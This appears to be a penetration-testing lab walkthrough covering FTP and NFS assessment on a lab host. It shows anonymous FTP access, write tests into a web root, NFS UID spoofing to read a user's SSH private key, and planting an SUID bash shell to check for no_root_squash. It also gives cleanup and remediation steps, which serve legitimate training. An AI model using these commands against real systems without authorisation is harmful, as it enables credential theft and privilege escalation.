Lab Objectives

Part 1 - FTP Assessment
1
FTP Identification and Banner Grab
▾

Port 21 FTP. Grab the banner and run nmap service scripts to get the daemon version before authenticating.

Commands

nc -vn 10.10.10.50 21
# Banner reveals daemon name and version

nmap -sV -p 21 --script ftp-syst 10.10.10.50
nmap -p 21 --script ftp-anon 10.10.10.50

ftp-syst Output

The SYST command reveals the operating system and FTP daemon flavour. Record this version string - it feeds into vulnerability research in F2.

Nmap ftp-anon tests anonymous login automatically. A "+" in the script output means anonymous access is permitted.
2
Anonymous FTP Login and Directory Enumeration
▾

Connect with the anonymous account and enumerate what is accessible. Any file in the FTP root is exposed to the entire network.

Connection

ftp 10.10.10.50
# Username: anonymous
# Password: (blank or any@email)

ftp> ls -la
ftp> pwd
ftp> ls -laR    # Recursive - careful on large shares

What to Look For

FindingSeverity
Configuration files (.conf, .ini, .env)High
Backup files (.bak, .old, .tar.gz)High
Scripts with credentials hardcodedCritical
World-readable /etc directory symlinkedCritical
Empty / no files - access confirmed onlyMedium

Download Interesting Files

ftp> get interesting-file.txt
ftp> mget *.conf
Never run mget * on an unknown FTP share without listing contents first. Exfiltrating client data you are not authorised to take violates rules of engagement.
3
FTP Write Access Test
▾

Write access to the FTP root is a significant escalation. If the FTP root overlaps with the web root, write access enables webshell upload and remote code execution.

Write Test

# Create a harmless test file locally first
echo "PENTEST-WRITE-TEST $(date)" > write-test.txt

ftp> put write-test.txt
# 226 Transfer complete = write permitted
# 550 Permission denied = write blocked

Check Web Root Overlap

# After write test, check if file appears via HTTP
curl -s http://10.10.10.50/write-test.txt
# 200 OK = FTP root IS the web root (Critical finding)
# 404 = FTP root does not overlap with web root

Clean Up - Mandatory

ftp> delete write-test.txt
# Confirm deletion before disconnecting
ftp> ls write-test.txt    # Should return no such file
Remove write-test.txt immediately after confirming the finding. Leaving test artefacts on client systems is a reversion failure and will be raised in the debrief.
Anonymous FTP + write access + web root overlap = Critical standalone finding. Document with before/after screenshots and the curl HTTP 200 response as a chain of evidence.
Part 2 - NFS Assessment
4
NFS Export Enumeration
▾

NFS runs over RPC. Identify available exports using showmount, then cross-reference with rpcinfo to confirm the service map.

Commands

# List NFS exports
showmount -e 10.10.10.50

# RPC service map - confirms NFS version and portmapper
rpcinfo -p 10.10.10.50

# Nmap NFS scripts
nmap -sV -p 111,2049 --script nfs-ls,nfs-showmount,nfs-statfs 10.10.10.50

Interpreting showmount Output

Export LineRisk
/home *Critical - world-mountable home dirs
/var/backups 10.10.10.0/24High - subnet-wide access to backups
/data trusted-hostMedium - host-restricted, check that host's security
Asterisk (*) in the client list means any host on the internet can mount the share. This is always at minimum a High finding regardless of what the export contains.
5
Mount NFS Share and Test UID/GID Access
▾

Mount a world-accessible export. NFS relies on the client's UID/GID for file-level access control. Creating a local user matching a target UID bypasses this entirely.

Mount the Share

mkdir /tmp/nfs-mount
mount -t nfs 10.10.10.50:/home /tmp/nfs-mount -nolock

# List contents
ls -lan /tmp/nfs-mount
# -lan shows numeric UIDs and GIDs

UID Matching Attack

# Identify a file owned by UID 1103
ls -lan /tmp/nfs-mount/
# -rw------- 1 1103 1103 1024 Oct 21 /tmp/nfs-mount/jsmith/id_rsa

# Create a matching local user
useradd -u 1103 syntex-match

# Switch to that user and read the file
su syntex-match
cat /tmp/nfs-mount/jsmith/id_rsa
# Access granted - UID matched

Check for no_root_squash

# If running as root, attempt to access root-owned files
ls /tmp/nfs-mount/root/ 2>/dev/null
# If successful: no_root_squash is set (Critical)

# Try creating an SUID shell (lab demonstration only)
cp /bin/bash /tmp/nfs-mount/bash-suid
chmod +s /tmp/nfs-mount/bash-suid
ls -la /tmp/nfs-mount/bash-suid
# -rwsr-xr-x = SUID bit set, no_root_squash confirmed Critical
If you create an SUID binary during this demonstration, delete it immediately: rm /tmp/nfs-mount/bash-suid. Leaving SUID binaries on client infrastructure is a reversion failure.

Reversion

umount /tmp/nfs-mount
rm -rf /tmp/nfs-mount
userdel syntex-match

Compile Findings - FTP and NFS
▾

Document both FTP and NFS findings in CPSA format. Each has its own title, evidence chain, and remediation recommendation.

Finding Summary Table

FindingSeverityEvidence Required

NFS world-mountable shareHighshowmount -e showing * client list

Remediation Template - NFS

# /etc/exports - Recommended configuration
# Replace:
# /home *
# With:
/home  trusted-host.syntex.local(ro,root_squash,nosuid,noexec)

# Verify:
exportfs -ra
showmount -e localhost
Operator Takeaway: Anonymous FTP and world-mountable NFS are both common on legacy Linux infrastructure. Finding both on the same host creates a multi-vector attack path: FTP for initial file read, NFS for privilege escalation if no_root_squash is set.
